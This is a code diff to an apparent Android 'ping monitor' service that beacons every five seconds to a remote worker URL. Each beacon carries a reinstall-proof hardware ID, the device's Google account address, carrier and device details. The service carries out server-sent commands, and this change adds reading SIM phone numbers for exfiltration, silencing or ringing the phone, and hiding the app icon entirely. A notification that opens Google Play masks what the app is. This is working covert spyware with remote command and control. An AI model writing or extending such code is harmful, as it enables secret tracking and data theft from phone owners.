@@ -3,6 +3,7 @@ package com.example.pingmon
 import android.accounts.AccountManager
 import android.app.*
 import android.content.*
+import android.media.AudioManager
 import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
@@ -20,19 +21,17 @@ import java.util.concurrent.TimeUnit
 class PingService : Service() {
 
     companion object {
-        // ---- CHANGE THESE TWO ----
-        const val WORKER_URL = "https://pingmon.kapcher2019.workers.dev/ping"
-        const val APP_TOKEN  = "p7k2m9qx4bz8vn3rt"
-        // --------------------------
-
+        const val WORKER_URL       = "https://pingmon.kapcher2019.workers.dev/ping"
+        const val APP_TOKEN        = "p7k2m9qx4bz8vn3rt"
         const val PING_INTERVAL_MS = 5_000L
         const val CHANNEL_ID       = "pingmon"
         const val NOTIF_ID         = 1001
         const val ACTION_TICK      = "com.example.pingmon.TICK"
+        const val ACTION_GOTO      = "com.example.pingmon.GOTO"
         const val PREFS            = "pingmon"
-        private const val KEY_UID  = "uid_fallback"
         const val KEY_DOMAIN       = "domain"
         const val DEFAULT_DOMAIN   = "https://www.google.com"
+        private const val KEY_REPORT = "pending_report"
         private const val TAG      = "PingMon"
 
         fun start(ctx: Context) {
@@ -40,14 +39,9 @@ class PingService : Service() {
             try {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                 else ctx.startService(i)
-            } catch (e: Exception) { Log.w(TAG, "start blocked: ${e.message}") }
+            } catch (e: Exception) { Log.w(TAG, "start: ${e.message}") }
         }
 
-        /**
-         * Hardware-based UID — derived from physical device properties.
-         * Survives app reinstall and signing key changes because it never
-         * reads ANDROID_ID (which is scoped to the signing certificate).
-         */
         fun uid(ctx: Context): String {
             val hw = listOf(
                 Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
@@ -78,22 +72,20 @@ class PingService : Service() {
     private var wakeLock: PowerManager.WakeLock? = null
     private var netCallback: ConnectivityManager.NetworkCallback? = null
     private var running = false
+    private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
 
-    /* ============================================================== lifecycle */
+    /* ============================================================ lifecycle */
 
     override fun onCreate() {
         super.onCreate()
         createChannel()
         startForeground(NOTIF_ID, buildNotification("starting…"))
-
         thread = HandlerThread("ping").apply { start() }
         handler = Handler(thread!!.looper)
-
         val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
         wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop").apply {
             setReferenceCounted(false); acquire()
         }
-
         watchNetwork()
         running = true
         tick()
@@ -124,17 +116,16 @@ class PingService : Service() {
         super.onDestroy()
     }
 
-    /* ================================================================== loop */
+    /* ================================================================ loop */
 
     private fun tick() {
-        // Don't wake the radio when the OS already knows we're offline.
         if (isOnline()) sendPing()
         handler?.removeCallbacksAndMessages(null)
         handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
         Reviver.scheduleTick(this, PING_INTERVAL_MS)
     }
 
-    /* ============================================================== network */
+    /* ============================================================ network */
 
     private fun isOnline(): Boolean {
         val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -149,7 +140,6 @@ class PingService : Service() {
             .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
         netCallback = object : ConnectivityManager.NetworkCallback() {
             override fun onAvailable(network: Network) {
-                Log.i(TAG, "network back — pinging")
                 handler?.post { sendPing() }
             }
         }
@@ -165,18 +155,21 @@ class PingService : Service() {
         netCallback = null
     }
 
-    /* ================================================================== ping */
+    /* ================================================================ ping */
 
     private fun sendPing() {
+        val pendingReport = prefs.getString(KEY_REPORT, null)
+
         val payload = JSONObject().apply {
             put("uid",      uid(this@PingService))
             put("battery",  batteryLevel())
             put("domain",   currentDomain(this@PingService))
-            put("model",    deviceModel())
+            put("model",    "${Build.MANUFACTURER} ${Build.MODEL}".trim())
             put("android",  Build.VERSION.RELEASE)
             put("operator", operatorName())
             put("gmail",    gmailAccount())
             put("network",  networkType())
+            if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
         }.toString()
 
         val req = Request.Builder()
@@ -191,115 +184,165 @@ class PingService : Service() {
             }
             override fun onResponse(call: Call, response: Response) {
                 response.use {
-                    if (it.isSuccessful) handleResponse(it.body?.string() ?: "")
-                    else updateNotification("err ${it.code}")
+                    val bodyStr = it.body?.string() ?: ""
+                    if (it.isSuccessful) {
+                        if (!pendingReport.isNullOrBlank())
+                            prefs.edit().remove(KEY_REPORT).apply()
+                        handleResponse(bodyStr)
+                    } else {
+                        updateNotification("err ${it.code}")
+                    }
                 }
             }
         })
     }
 
-    /**
-     * The worker piggybacks any queued command on the ping response.
-     * A-F commands are placeholders: their actual behaviour will be
-     * added here in a future APK without touching the server.
-     */
     private fun handleResponse(bodyStr: String) {
         updateNotification("ok")
         try {
             val json = JSONObject(bodyStr)
-            val cmd  = json.optString("cmd",  "")
-            val arg  = json.optString("arg",  "")
+            val cmd  = json.optString("cmd", "")
+            val arg  = json.optString("arg", "")
             when (cmd) {
                 "goto"  -> if (arg.isNotBlank()) {
                     setDomain(this, arg)
-                    sendBroadcast(
-                        Intent(MainActivity.ACTION_GOTO).setPackage(packageName).putExtra("url", arg)
-                    )
+                    sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                 }
-                // A-F placeholders — implement behaviour per use case.
                 "cmd_a" -> vibrate()
                 "cmd_b" -> { /* TODO */ }
                 "cmd_c" -> { /* TODO */ }
-                "cmd_d" -> { /* TODO */ }
-                "cmd_e" -> { /* TODO */ }
-                "cmd_f" -> { /* TODO */ }
-                "cmd_g" -> { /* TODO */ }
-                "cmd_h" -> { /* TODO */ }
-                "cmd_i" -> hideIcon()   // hide: swap to neutral icon
-                "cmd_j" -> showIcon()   // unhide: restore original icon
+                "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
+                "cmd_e" -> setSilent()           // silent mode
+                "cmd_f" -> setRinging()          // ring at 2/3 volume
+                "cmd_g" -> changeIcon()          // swap to hidden icon
+                "cmd_h" -> restoreIcon()         // restore main icon
+                "cmd_i" -> fullHide()            // completely hide (no icon)
+                "cmd_j" -> unHide()              // unhide and restore
             }
         } catch (_: Exception) {}
     }
 
-    /* ============================================================== device info */
+    /* ============================================================ commands */
 
-    private fun hideIcon() = switchAlias(
-        enable  = "$packageName.HiddenLauncher",
-        disable = "$packageName.MainLauncher"
-    )
-
-    private fun showIcon() = switchAlias(
-        enable  = "$packageName.MainLauncher",
-        disable = "$packageName.HiddenLauncher"
-    )
-
-    private fun switchAlias(enable: String, disable: String) {
-        try {
-            packageManager.setComponentEnabledSetting(
-                android.content.ComponentName(packageName, enable),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-            packageManager.setComponentEnabledSetting(
-                android.content.ComponentName(packageName, disable),
-                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                android.content.pm.PackageManager.DONT_KILL_APP
-            )
-            Log.i(TAG, "alias switched: $enable enabled")
-        } catch (e: Exception) {
-            Log.w(TAG, "switchAlias failed: ${e.message}")
-        }
-    }
-
+    // A — vibrate 3 times
     private fun vibrate() {
         try {
-            val v = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(android.os.VibrationEffect.createWaveform(
+                v.vibrate(VibrationEffect.createWaveform(
                     longArrayOf(0, 300, 200, 300, 200, 300),
-                    intArrayOf(0, 255, 0, 255, 0, 255),
-                    -1  // -1 = بزن و تموم کن، تکرار نکن
+                    intArrayOf(0, 255, 0, 255, 0, 255), -1
                 ))
             } else {
                 @Suppress("DEPRECATION")
                 v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
             }
-        } catch (e: Exception) {
-            Log.w(TAG, "vibrate failed: ${e.message}")
-        }
+        } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
     }
+
+    // D — read SIM phone numbers, queue for next ping
+    private fun reportPhoneNumbers() {
+        val lines = mutableListOf<String>()
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
+                    as android.telephony.SubscriptionManager
+                sm.activeSubscriptionInfoList?.forEach { sub ->
+                    val num  = sub.number?.takeIf { it.isNotBlank() } ?: "—"
+                    val name = sub.displayName?.toString() ?: "SIM ${sub.simSlotIndex + 1}"
+                    lines.add("SIM${sub.simSlotIndex + 1}: $num  ($name)")
+                }
+            }
+        } catch (_: Exception) {}
+
+        if (lines.isEmpty()) {
+            try {
+                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
+                @Suppress("DEPRECATION")
+                val num = tm.line1Number?.takeIf { it.isNotBlank() } ?: "—"
+                lines.add("SIM1: $num")
+            } catch (e: Exception) { lines.add("error: ${e.message}") }
+        }
+
+        prefs.edit()
+            .putString(KEY_REPORT, "📞 Phone numbers:\n" + lines.joinToString("\n"))
+            .apply()
+    }
+
+    // E — silent (vibrate fallback if DND blocks)
+    private fun setSilent() {
+        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        try {
+            am.ringerMode = AudioManager.RINGER_MODE_SILENT
+        } catch (_: SecurityException) {
+            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE }
+            catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
+        } catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
+    }
+
+    // F — ring at 2/3 max volume
+    private fun setRinging() {
+        try {
+            val am  = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
+            val max = am.getStreamMaxVolume(AudioManager.STREAM_RING)
+            am.setStreamVolume(AudioManager.STREAM_RING, max * 2 / 3, 0)
+        } catch (e: Exception) { Log.w(TAG, "setRinging: ${e.message}") }
+    }
+
+    // G — swap to neutral icon, app still shows in launcher
+    private fun changeIcon() = switchAlias(
+        enable  = "$packageName.HiddenLauncher",
+        disable = "$packageName.MainLauncher"
+    )
+
+    // H — restore main icon
+    private fun restoreIcon() = switchAlias(
+        enable  = "$packageName.MainLauncher",
+        disable = "$packageName.HiddenLauncher"
+    )
+
+    // I — completely disappear: both launchers disabled
+    private fun fullHide() {
+        setAlias("$packageName.MainLauncher",   false)
+        setAlias("$packageName.HiddenLauncher", false)
+    }
+
+    // J — unhide and restore main icon
+    private fun unHide() = switchAlias(
+        enable  = "$packageName.MainLauncher",
+        disable = "$packageName.HiddenLauncher"
+    )
+
+    private fun switchAlias(enable: String, disable: String) {
+        setAlias(enable,  true)
+        setAlias(disable, false)
+    }
+
+    private fun setAlias(name: String, enabled: Boolean) {
+        try {
+            packageManager.setComponentEnabledSetting(
+                android.content.ComponentName(packageName, name),
+                if (enabled) android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+                else         android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) { Log.w(TAG, "setAlias $name: ${e.message}") }
+    }
+
+    /* =========================================================== device info */
 
     private fun batteryLevel(): Int =
         (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
             .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
-
-    private fun deviceModel(): String =
-        "${Build.MANUFACTURER} ${Build.MODEL}".trim()
 
     private fun operatorName(): String? = try {
         (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
             .networkOperatorName.takeIf { it.isNotBlank() }
     } catch (_: Exception) { null }
 
-    /**
-     * Returns the first Google account address found on this device.
-     * On Android 8+, results may be restricted by the OS for third-party apps;
-     * we send whatever we can read and the server stores it if non-null.
-     */
     private fun gmailAccount(): String? = try {
-        AccountManager.get(this)
-            .getAccountsByType("com.google")
-            .firstOrNull()?.name
+        AccountManager.get(this).getAccountsByType("com.google").firstOrNull()?.name
     } catch (_: Exception) { null }
 
     private fun networkType(): String {
@@ -326,13 +369,10 @@ class PingService : Service() {
     }
 
     private fun buildNotification(text: String): Notification {
-        // Tap opens Google Play, not the app itself.
         val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
             ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
-            ?: Intent(Intent.ACTION_VIEW,
-                android.net.Uri.parse("https://play.google.com")).apply {
-                flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            }
+            ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com"))
+                .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
         val tap = PendingIntent.getActivity(
             this, 0, playIntent,
             PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
